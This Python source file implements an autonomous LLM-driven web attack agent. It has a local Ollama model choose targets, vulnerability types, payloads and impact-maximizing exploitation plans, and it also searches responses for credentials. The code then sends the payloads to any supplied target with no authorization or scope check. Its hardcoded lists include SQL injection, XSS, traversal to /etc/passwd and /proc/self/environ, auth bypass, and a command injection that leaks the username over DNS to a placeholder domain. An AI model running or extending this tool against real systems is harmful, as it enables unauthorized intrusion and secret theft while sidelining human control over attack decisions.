"""
AI Brain - TRUE AI Agent that genuinely thinks and decides using Ollama
OBSERVE → THINK → PLAN → ACT → LEARN loop
"""
import asyncio
import json
import os
import random
import time
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse

import aiohttp

root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import sys
if root_dir not in sys.path:
    sys.path.insert(0, root_dir)

from nx_platform.v4.core.config import logger


def get_ollama_config():
    """Get Ollama API configuration from config"""
    try:
        from nx_platform.v4.core.ai_config import get_config
        config = get_config()
        return config
    except:
        return {
            "host": os.getenv("OLLAMA_HOST", "http://localhost:11434"),
            "model": os.getenv("OLLAMA_MODEL", "deepseek-r1:8b"),
            "timeout": int(os.getenv("AI_HTTP_TIMEOUT", "600"))
        }


async def call_ollama(prompt: str, system: str = None, activity_type: str = "analyze", job_id: str = None) -> str:
    """Make API call to Ollama and log activity"""
    from nx_platform.v4.api.models import AIActivityLog, GLOBAL_AI_LOGS, ACTIVE_JOBS
    from nx_platform.v4.core.storage import save_ai_activity
    
    config = get_ollama_config()
    url = f"{config['host']}/api/generate"
    start_time = time.time()
    
    payload = {
        "model": config["model"],
        "prompt": prompt,
        "stream": False,
        "options": {
            "temperature": 0.3,
            "top_p": 0.8
        }
    }
    if system:
        payload["system"] = system
    
    response_text = ""
    status = "failure"
    
    try:
        timeout = aiohttp.ClientTimeout(total=config.get("timeout", 600))
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(url, json=payload) as resp:
                if resp.status == 200:
                    result = await resp.json()
                    response_text = result.get("response", "").strip()
                    status = "success"
                else:
                    logger.warning(f"[AI Brain] Ollama error: {resp.status}")
                    response_text = f"Error: HTTP {resp.status}"
    except Exception as e:
        logger.warning(f"[AI Brain] Ollama call failed: {e}")
        response_text = f"Error: {str(e)}"
    
    duration = (time.time() - start_time) * 1000  # ms
    
    # Log Activity
    activity = AIActivityLog(
        activity_type=activity_type,
        prompt=prompt,
        response=response_text,
        duration=duration,
        status=status,
        model_used=config["model"],
        job_id=job_id,
        parameters={"system": system} if system else {}
    )
    
    # Update Job if exists
    if job_id and job_id in ACTIVE_JOBS:
        job = ACTIVE_JOBS[job_id]
        job.ai_activities.append(activity)
        # Update metrics
        total = len(job.ai_activities)
        job.metrics["total_requests"] = total
        job.metrics["avg_response_time"] = ((job.metrics["avg_response_time"] * (total - 1)) + duration) / total
        if status == "failure":
            job.metrics["success_rate"] = (sum(1 for a in job.ai_activities if a.status == "success") / total) * 100
            
    GLOBAL_AI_LOGS.append(activity)
    save_ai_activity(activity.model_dump())
    
    # FIX: Return a clear error indicator if status is failure
    if status == "failure":
        return json.dumps({"error": response_text, "is_system_error": True})
        
    return response_text


class AIBrain:
    """
    True AI Brain - thinks like a human pentester
    """
    
    def __init__(self, target: str, job_id: str = None):
        self.target = target
        self.job_id = job_id or f"job_{int(time.time())}"
        self.learned = []  # Learn from failures
        self.vulns_found = []
        
    async def __aenter__(self):
        logger.info(f"[AIBrain] 🤖 Initializing AI Brain for {self.target}")
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        logger.info(f"[AIBrain] Shutting down. Found: {len(self.vulns_found)} vulns, Learned: {len(self.learned)} lessons")
    
    async def observe(self, urls: List[str]) -> Dict:
        """
        PHASE 1: OBSERVE - Analyze URLs and understand the target
        """
        logger.info(f"[AIBrain] 📡 OBSERVE: Analyzing {len(urls)} URLs...")
        
        # Group URLs by path to avoid redundant analysis
        unique_paths = list(set([urlparse(u).path for u in urls if u.strip()]))
        
        prompt = f"""You are an Elite Offensive Security Architect analyzing a target.

TARGET: {self.target}

Analyze these URL paths and identify the ones with the highest potential for critical vulnerabilities.
Focus on: authentication, data entry, file management, API endpoints, and administrative interfaces.

URL Paths:
{chr(10).join(unique_paths[:40])}

Respond in JSON format:
{{
    "interesting_urls": [
        {{"url": "full_url_example", "category": "login/upload/api/etc", "reason": "why this is high risk", "priority": "high/medium/low"}}
    ],
    "target_tech_stack": "guessed tech stack based on paths",
    "attack_strategy": "overall strategy for this target"
}}"""

        result = await call_ollama(prompt, activity_type="observe", job_id=self.job_id)
        
        try:
            if "{" in result:
                json_start = result.find("{")
                json_end = result.rfind("}") + 1
                if json_start >= 0 and json_end > json_start:
                    data = json.loads(result[json_start:json_end])
                    if data.get("is_system_error"):
                        return {"interesting_urls": [], "target_tech_stack": "unknown"}
                    
                    # Reconstruct full URLs from paths if AI only returned paths
                    for item in data.get("interesting_urls", []):
                        path = item.get("url")
                        if path and not path.startswith("http"):
                            # Find original URL that matches this path
                            for original in urls:
                                if path in original:
                                    item["url"] = original
                                    break
                    return data
        except:
            pass
        
        return {
            "interesting_urls": [{"url": u, "category": "unknown", "reason": "fallback", "priority": "medium"} for u in urls[:10]],
            "summary": "Basic observation complete"
        }
    
    async def think(self, question: str) -> Dict:
        """
        PHASE 2: THINK - AI makes a decision
        """
        # Include learned lessons in thinking
        lessons = ""
        if self.learned:
            lessons = "\n".join([f"- {l}" for l in self.learned[-5:]])
            lessons = f"\n\nLessons learned from previous attempts:\n{lessons}\n"
        
        prompt = f"""{question}
{lessons}

You are a penetration tester deciding what vulnerability to test.
Think step by step. Consider:
- URL structure and parameters
- What the page likely does
- Previous test results

Respond with ONLY valid JSON (no markdown):
{{
    "vuln_type": "sqli/xss/lfi/csrf/idor/upload/403_bypass/rce",
    "confidence": "high/medium/low",
    "reason": "why this makes sense",
    "next_step": "what to do next"
}}"""

        result = await call_ollama(prompt, activity_type="think", job_id=self.job_id)
        
        try:
            if "{" in result:
                json_start = result.find("{")
                json_end = result.rfind("}") + 1
                if json_start >= 0 and json_end > json_start:
                    data = json.loads(result[json_start:json_end])
                    if data.get("is_system_error"):
                        return {"vuln_type": "none", "confidence": "none", "error": data.get("error")}
                    return data
        except:
            pass
        
        return {"vuln_type": "xss", "confidence": "low", "reason": "fallback", "next_step": "try basic xss"}
    
    async def plan_attack(self, url: str, vuln_type: str) -> Dict:
        """
        PHASE 3: PLAN - AI creates a detailed attack plan
        """
        logger.info(f"[AIBrain] 🧠 PLAN: Creating attack plan for {vuln_type} on {url}")
        
        prompt = f"""Create a detailed attack plan for testing {vuln_type} vulnerability on:

URL: {url}
Target: {self.target}

Generate specific payloads and test approach.
Consider: encoding, bypass techniques, edge cases.

Respond with JSON:
{{
    "attack_type": "{vuln_type}",
    "payloads": ["payload1", "payload2", ...],
    "test_locations": ["parameter1", ...],
    "expected_signals": ["error message pattern", ...],
    "bypass_techniques": ["technique1", ...]
}}"""

        result = await call_ollama(prompt, activity_type="plan", job_id=self.job_id)
        
        try:
            if "{" in result:
                json_start = result.find("{")
                json_end = result.rfind("}") + 1
                return json.loads(result[json_start:json_end])
        except:
            pass
        
        # Fallback to smart defaults
        return self._default_plan(vuln_type, url)
    
    async def act(self, url: str, plan: Dict, vuln_type: str) -> Dict:
        """
        PHASE 4: ACT - Execute the attack plan
        """
        logger.info(f"[AIBrain] ⚡ ACT: Executing {vuln_type} attack on {url}")
        
        payloads = plan.get("payloads", [])
        if not payloads:
            payloads = self._default_payloads(vuln_type)
        
        test_locations = plan.get("test_locations", ["q", "search", "id", "query", "url", "redirect"])
        
        for payload in payloads[:10]:  # Limit to 10
            for param in test_locations[:5]:  # Limit to 5 params
                test_url = self._build_test_url(url, param, payload)
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(test_url, timeout=5) as resp:
                            await self._analyze_response(resp, vuln_type, payload, url)
                except:
                    pass
                
                await asyncio.sleep(0.1)
        
        return {"success": False, "url": url, "vuln_type": vuln_type}
    
    async def learn(self, vuln_type: str, url: str, result: str, success: bool):
        """
        PHASE 5: LEARN - Learn from success or failure
        """
        if success:
            logger.info(f"[AIBrain] 📚 LEARN: Found {vuln_type} on {url}!")
            self.vulns_found.append({
                "type": vuln_type,
                "url": url,
                "result": result
            })
        else:
            lesson = f"{vuln_type} failed on {url}: {result}"
            self.learned.append(lesson)
            logger.debug(f"[AIBrain] 📚 Learned: {lesson}")
    
    async def analyze_vulnerability_response(self, audit_result: Dict) -> Dict:
        """
        [Phase 2] AI-powered response analysis
        Interpret results to identify risk level and potential flaws
        """
        logger.info(f"[AIBrain] 🧠 Analyzing audit results for {audit_result['url']}")
        
        prompt = f"""You are an Elite Offensive Security Architect.
Analyze this raw HTTP audit result and determine the risk level.

URL: {audit_result['url']}
STATUS: {audit_result['status']}
INDICATORS: {json.dumps(audit_result['indicators'])}
BODY PREVIEW: {audit_result['body_preview'][:500]}

Identify:
1. Business logic flaws (e.g. access control issues)
2. Likely vulnerable parameters
3. Recommended active testing payloads

Respond with JSON:
{{
    "risk_level": "critical/high/medium/low",
    "vulnerability_indicators": ["vulnerability1", ...],
    "vulnerable_parameters": ["param1", ...],
    "testing_strategy": "what specific active tests to run",
    "logic_flaw_detected": true/false
}}"""

        result = await call_ollama(prompt, activity_type="analyze", job_id=self.job_id)
        
        try:
            if "{" in result:
                json_start = result.find("{")
                json_end = result.rfind("}") + 1
                return json.loads(result[json_start:json_end])
        except:
            pass
            
        return {"risk_level": "low", "logic_flaw_detected": False}

    async def situational_awareness_analysis(self, audit_result: Dict) -> Dict:
        """
        [Phase 2 & 4] Deep Situational Awareness Analysis
        Detects exposed APIs, hardcoded credentials, and interprets security context.
        Also suggests optimal HTTP methods and heavy tools for testing.
        """
        logger.info(f"[AIBrain] 🧠 Situational Awareness: Analyzing {audit_result['url']}")
        
        prompt = f"""You are an Elite Offensive Security Architect performing Situational Awareness Analysis.

AUDIT DATA:
URL: {audit_result['url']}
STATUS: {audit_result['status']}
HEADERS: {json.dumps(audit_result['headers'])}
BODY PREVIEW: {audit_result['body_preview'][:1000]}

TASKS:
1. Detect exposed API endpoints or sensitive files (.env, config, etc.)
2. Search for hardcoded credentials: API keys, JWT, DB strings, Passwords.
3. Interpret security context: HTTP behavior, error messages, system changes.
4. Suggest optimal HTTP METHODS to test.
5. Identify if heavy tools like 'sqlmap' or 'dalfox' should be used on specific parameters.
6. Generate a valid 'curl' command to validate the finding.

Respond with ONLY valid JSON:
{{
    "exposed_components": ["component1", ...],
    "credentials_detected": [
        {{"type": "api_key/jwt/etc", "value": "secret", "confidence": 0.9}}
    ],
    "situational_context": {{
        "severity": "critical/high/medium/low",
        "attack_vector": "description",
        "impact": "potential impact",
        "behavior_analysis": "how the system responded",
        "suggested_methods": ["GET", "POST", ...],
        "heavy_tool_recommended": "sqlmap/dalfox/none",
        "target_parameter": "param_name"
    }},
    "validation_curl": "curl -X GET 'url' -H 'header'...",
    "risk_score": 1-10
}}"""

        result = await call_ollama(prompt, activity_type="think", job_id=self.job_id)
        
        try:
            if "{" in result:
                json_start = result.find("{")
                json_end = result.rfind("}") + 1
                data = json.loads(result[json_start:json_end])
                if data.get("is_system_error"):
                    return {"risk_score": 0, "exposed_components": []}
                return data
        except:
            pass
            
        return {"risk_score": 0, "exposed_components": []}

    async def generate_vulnerability_report(self, finding: Dict) -> Dict:
        """
        [Phase 4] Generate detailed vulnerability report with CVSS and remediation
        """
        logger.info(f"[AIBrain] 📝 Generating detailed report for {finding['type']} on {finding['url']}")
        
        prompt = f"""Generate a professional security report for this vulnerability:

TYPE: {finding['type']}
URL: {finding['url']}
EVIDENCE: {finding.get('evidence', 'N/A')}
PARAMETER: {finding.get('parameter', 'N/A')}
PAYLOAD: {finding.get('payload', 'N/A')}

Provide:
1. CVSS v3.1 Score and Vector
2. Proof of Concept (PoC)
3. Recommended Exploitation Strategy
4. Technical Remediation Recommendations

Respond with JSON:
{{
    "cvss_score": 8.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "poc": "step by step poc",
    "exploitation_strategy": "how to maximize impact",
    "remediation": "how to fix it",
    "description": "detailed technical description"
}}"""

        result = await call_ollama(prompt, activity_type="think", job_id=self.job_id)
        
        try:
            if "{" in result:
                json_start = result.find("{")
                json_end = result.rfind("}") + 1
                report_data = json.loads(result[json_start:json_end])
                if report_data.get("is_system_error"):
                    return finding
                return {**finding, **report_data}
        except:
            pass
            
        return finding

    def _default_plan(self, vuln_type: str, url: str) -> Dict:
        """Generate default attack plan with advanced payloads"""
        plans = {
            "sqli": {
                "payloads": [
                    "'", "1' OR '1'='1", "1' OR 1=1--", "1' UNION SELECT NULL,NULL,NULL--",
                    "admin'--", "') OR ('1'='1", "1\" OR \"1\"=\"1", "sleep(5)#"
                ],
                "test_locations": ["id", "user", "pass", "search", "query", "email", "token"]
            },
            "xss": {
                "payloads": [
                    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", 
                    "javascript:alert(1)", "\"><script>alert(1)</script>",
                    "<svg/onload=alert(1)>", "'-alert(1)-'", "jaVasCript:alert(1)"
                ],
                "test_locations": ["q", "s", "search", "name", "comment", "text", "msg", "msg_body"]
            },
            "lfi": {
                "payloads": [
                    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", 
                    "/etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index.php",
                    "/proc/self/environ", "/var/log/apache2/access.log"
                ],
                "test_locations": ["file", "path", "page", "include", "doc", "template", "view", "load"]
            },
            "cmd_injection": {
                "payloads": [
                    "; id", "| id", "`id`", "$(id)", "&& id", "|| id",
                    "; nslookup `whoami`.TARGET_DOMAIN", "| ping -c 1 127.0.0.1"
                ],
                "test_locations": ["host", "ip", "cmd", "exec", "ping", "domain", "process"]
            },
            "auth_bypass": {
                "payloads": ["admin'--", "admin' #", "' OR '1'='1", "admin' OR '1'='1'--"],
                "test_locations": ["user", "username", "login", "email", "handle"]
            },
            "dir_traversal": {
                "payloads": ["../../../etc/passwd", "../../../../../../../../../etc/passwd", "..%2f..%2f..%2fetc/passwd"],
                "test_locations": ["path", "dir", "folder", "root", "base"]
            }
        }
        return plans.get(vuln_type, {"payloads": ["test"], "test_locations": ["q"]})
    
    def _default_payloads(self, vuln_type: str) -> List[str]:
        """Default payloads by vuln type"""
        return self._default_plan(vuln_type, "")["payloads"]
    
    def _build_test_url(self, url: str, param: str, payload: str) -> str:
        """Build test URL with parameter"""
        if "?" in url:
            return f"{url}&{param}={payload}"
        return f"{url}?{param}={payload}"
    
    async def _analyze_response(self, resp, vuln_type: str, payload: str, url: str):
        """Analyze response for vulnerability signs"""
        try:
            text = await resp.text()
            
            signals = {
                "sqli": ["sql", "syntax", "mysql", "error", "warning"],
                "xss": ["<script", "alert(", "onerror"],
                "lfi": ["root:", "[boot loader]", "/etc/passwd"]
            }
            
            for signal in signals.get(vuln_type, []):
                if signal.lower() in text.lower():
                    await self.learn(vuln_type, url, f"Found signal: {signal}", True)
                    return
        except:
            pass


async def run_ai_agent(target: str, all_urls: List[str], job_id: str = None) -> List[Dict]:
    """
    Main entry point for True AI Agent
    """
    logger.info(f"[TrueAI] 🤖 Starting True AI Agent for {target}")
    
    findings = []
    
    async with AIBrain(target, job_id) as brain:
        # Phase 1: OBSERVE
        observation = await brain.observe(all_urls)
        
        interesting = observation.get("interesting_urls", [])
        logger.info(f"[TrueAI] Found {len(interesting)} interesting URLs")
        
        # Phase 2-5: For each interesting URL, think→plan→act→learn
        for url_info in interesting[:30]:
            url = url_info.get("url")
            
            # THINK
            decision = await brain.think(f"What to test for: {url}")
            vuln_type = decision.get("vuln_type", "xss")
            
            # PLAN
            plan = await brain.plan_attack(url, vuln_type)
            
            # ACT
            result = await brain.act(url, plan, vuln_type)
            
            if result.get("success"):
                findings.append(result)
        
        # Get all findings
        findings = brain.vulns_found
    
    logger.info(f"[TrueAI] ✅ Complete. Found {len(findings)} vulnerabilities")
    return findings